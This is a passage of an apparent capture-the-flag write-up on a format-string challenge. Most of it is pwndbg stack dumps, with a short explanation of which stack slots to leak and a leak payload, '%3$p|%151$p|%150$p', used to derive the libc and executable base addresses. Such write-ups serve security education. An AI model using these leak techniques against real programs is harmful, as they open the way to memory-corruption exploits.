+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="nt">0x028</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6ed4f0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1f4f0</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="nt">0x030</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6ed430</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1f430</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="nt">0x048</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a8bf723</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">libc-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1723</span><span class="w"> </span><span class="o">(</span><span class="nt">_IO_2_1_stdout_</span><span class="o">+</span><span class="nt">131</span><span class="o">)</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="nt">0x058</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a7e0297</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">libc-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0xec297</span><span class="w"> </span><span class="o">(</span><span class="nt">write</span><span class="o">+</span><span class="nt">23</span><span class="o">)</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="nt">0x080</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a8bf6a0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">libc-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x16a0</span><span class="w"> </span><span class="o">(</span><span class="nt">_IO_2_1_stdout_</span><span class="o">)</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="nt">0x088</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f853d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r--p</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x53d</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="nt">0x090</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9fa020</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x20</span><span class="w"> </span><span class="o">(</span><span class="nt">stdout</span><span class="o">@</span><span class="p">@</span><span class="k">GLIBC_2</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">5</span><span class="o">)</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="nt">0x098</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a8bb4a0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r--p</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">libc-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x14a0</span><span class="w"> </span><span class="o">(</span><span class="nt">__GI__IO_file_jumps</span><span class="o">)</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="nt">0x0a8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a762e93</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">libc-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x6ee93</span><span class="w"> </span><span class="o">(</span><span class="nt">__GI__IO_file_overflow</span><span class="o">+</span><span class="nt">275</span><span class="o">)</span>
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="nt">0x0b8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a8bf6a0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">libc-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x16a0</span><span class="w"> </span><span class="o">(</span><span class="nt">_IO_2_1_stdout_</span><span class="o">)</span>
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="nt">0x0c0</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f853d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r--p</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x53d</span>
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="nt">0x0c8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a75659a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">libc-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x6259a</span><span class="w"> </span><span class="o">(</span><span class="nt">puts</span><span class="o">+</span><span class="nt">378</span><span class="o">)</span>
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="nt">0x0d8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6ed970</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1f970</span>
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="nt">0x0e0</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f7220</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x220</span><span class="w"> </span><span class="o">(</span><span class="nt">_start</span><span class="o">)</span>
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="nt">0x0e8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6edab0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1fab0</span>
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="nt">0x0f8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f77a0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x7a0</span><span class="w"> </span><span class="o">(</span><span class="nt">func</span><span class="o">+</span><span class="nt">515</span><span class="o">)</span>
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="nt">0x108</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6ed5a9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1f5a9</span>
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="nt">0x118</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a8c4570</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">anon_7f0b0a8c0</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x4570</span>
+<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="nt">0x150</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a8fd4f8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">anon_7f0b0a8fd</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x4f8</span>
+<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="nt">0x158</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6ed708</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1f708</span>
+<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="nt">0x560</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f7970</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x970</span><span class="w"> </span><span class="o">(</span><span class="nt">__libc_csu_init</span><span class="o">)</span>
+<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="nt">0x570</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6ed9c0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1f9c0</span>
+<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="nt">0x578</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f7970</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x970</span><span class="w"> </span><span class="o">(</span><span class="nt">__libc_csu_init</span><span class="o">)</span>
+<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="nt">0x580</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6ed9c0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1f9c0</span>
+<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="nt">0x588</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f795a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x95a</span><span class="w"> </span><span class="o">(</span><span class="nt">main</span><span class="o">+</span><span class="nt">406</span><span class="o">)</span>
+<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="nt">0x598</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6edac8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1fac8</span>
+<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="nt">0x5a0</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6edab8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1fab8</span>
+<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a><span class="nt">0x5c0</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6edac0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1fac0</span>
+<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="nt">0x5c8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6edb50</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1fb50</span>
+<a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a><span class="nt">0x5d8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a6f6083</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">libc-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x2083</span><span class="w"> </span><span class="o">(</span><span class="nt">__libc_start_main</span><span class="o">+</span><span class="nt">243</span><span class="o">)</span>
+<a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a><span class="nt">0x5e0</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a8fb620</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r--p</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">ld-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x620</span><span class="w"> </span><span class="o">(</span><span class="nt">_rtld_global_ro</span><span class="o">)</span>
+<a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a><span class="nt">0x5e8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6edab8</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1fab8</span>
+<a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a><span class="nt">0x5f8</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f77c4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x7c4</span><span class="w"> </span><span class="o">(</span><span class="nt">main</span><span class="o">)</span>
+<a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a><span class="nt">0x600</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f7970</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x970</span><span class="w"> </span><span class="o">(</span><span class="nt">__libc_csu_init</span><span class="o">)</span>
+<a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a><span class="nt">0x610</span><span class="o">:</span><span class="w"> </span><span class="nt">0x000055a2df9f7220</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">host</span><span class="o">/</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0_remotelibc</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x220</span><span class="w"> </span><span class="o">(</span><span class="nt">_start</span><span class="o">)</span>
+<a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a><span class="nt">0x618</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6edab0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1fab0</span>
+</code></pre></div>
+<p>If you try to leak closer executable memory addresses, you will face some issues. For example if you try to leak <strong>0x088</strong> or <strong>0x090</strong> offsets, you can not get those addresses. This happens in the runtime these addresses offsets changes because of executable printing and inserting texts into that stack area. So the needed leak address for executable memory space should be carefully choose. So i decided to choose return address of func in stack which is <strong>0x588: main+406</strong>. </p>
+<p>This chosen because of these addresses should be stable in the those stack locations. This way or another way when func function reach to end it should be return to the main. Also this offset and address will be useful later. So the offset <strong>0x580</strong> is the <strong>rbp</strong> offset.</p>
+<p>The final crafted payload for leak: <code>%3$p|%151$p|%150$p</code>.</p>
+<p><img alt="" src="../images/3572c5a99803f08ee3b1ea8c59d521d6.png" /></p>
+<p>The rest is subtracting offsets from addresses and getting base addresses of libc and executable. </p>
+<p><img alt="" src="../images/a010ad208f165816a5684cdb709e8393.png" /></p>
+<p>You may wonder why subtracting 0x50 from rbp. As you can see rbp address points rbp_address+0x50 inside of it. This arranged by the executable. If you check a few instruction below from func prologue routine, the addition happens via rax. </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nt">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">tele</span><span class="w"> </span><span class="o">$</span><span class="nt">rsp</span><span class="o">+</span><span class="nt">0x400</span><span class="w"> </span><span class="nt">32</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nt">00</span><span class="p">:</span><span class="nd">0000</span><span class="err">│</span><span class="nt">-080</span><span class="w"> </span><span class="nt">0x7ffc5889a010</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="o">...</span><span class="w"> </span><span class="err">↓</span><span class="w">        </span><span class="nt">11</span><span class="w"> </span><span class="nt">skipped</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="nt">0c</span><span class="p">:</span><span class="nd">0060</span><span class="err">│</span><span class="nt">-020</span><span class="w"> </span><span class="nt">0x7ffc5889a070</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x55e0ed271970</span><span class="w"> </span><span class="o">(</span><span class="nt">__libc_csu_init</span><span class="o">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">endbr64</span><span class="w"> </span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nt">0d</span><span class="p">:</span><span class="nd">0068</span><span class="err">│</span><span class="nt">-018</span><span class="w"> </span><span class="nt">0x7ffc5889a078</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0xd3440f1a4a413500</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="nt">0e</span><span class="p">:</span><span class="nd">0070</span><span class="err">│</span><span class="nt">-010</span><span class="w"> </span><span class="nt">0x7ffc5889a080</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889a0e0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="nt">0f</span><span class="p">:</span><span class="nd">0078</span><span class="err">│</span><span class="nt">-008</span><span class="w"> </span><span class="nt">0x7ffc5889a088</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x55e0ed271970</span><span class="w"> </span><span class="o">(</span><span class="nt">__libc_csu_init</span><span class="o">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">endbr64</span><span class="w"> </span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="nt">10</span><span class="p">:</span><span class="nd">0080</span><span class="err">│</span><span class="w"> </span><span class="nt">rbp</span><span class="w"> </span><span class="nt">0x7ffc5889a090</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889a0e0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="nt">11</span><span class="p">:</span><span class="nd">0088</span><span class="err">│</span><span class="o">+</span><span class="nt">008</span><span class="w"> </span><span class="nt">0x7ffc5889a098</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x55e0ed27195a</span><span class="w"> </span><span class="o">(</span><span class="nt">main</span><span class="o">+</span><span class="nt">406</span><span class="o">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">lea</span><span class="w"> </span><span class="nt">rdi</span><span class="o">,</span><span class="w"> </span><span class="o">[</span><span class="nt">rip</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0xe39</span><span class="o">]</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="nt">12</span><span class="p">:</span><span class="nd">0090</span><span class="err">│</span><span class="o">+</span><span class="nt">010</span><span class="w"> </span><span class="nt">0x7ffc5889a0a0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">2</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="nt">13</span><span class="p">:</span><span class="nd">0098</span><span class="err">│</span><span class="o">+</span><span class="nt">018</span><span class="w"> </span><span class="nt">0x7ffc5889a0a8</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889a1e8</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889b710</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="nt">14</span><span class="p">:</span><span class="nd">00a0</span><span class="err">│</span><span class="o">+</span><span class="nt">020</span><span class="w"> </span><span class="nt">0x7ffc5889a0b0</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889a1d8</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="nt">0x7ffc5889b6ee</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="nt">0</span>
